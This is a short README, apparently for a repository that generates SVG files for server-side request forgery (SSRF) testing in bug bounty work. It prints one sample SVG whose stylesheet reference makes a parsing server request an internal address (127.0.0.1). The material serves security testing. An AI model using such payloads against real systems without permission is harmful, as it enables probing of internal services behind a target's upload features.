#  SVG SSRF Payload Generator

This repo generates SVG files with embedded XML stylesheet references for **SSRF testing**. It’s useful in bug bounty and security research when testing file upload features or backend image processing engines.

---

##  How It Works

Each SVG file contains an SSRF payload like this:

```xml
<?xml version="1.0" standalone="yes"?>
<?xml-stylesheet type="text/css" href="http://127.0.0.1:80"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="red"/>
</svg>
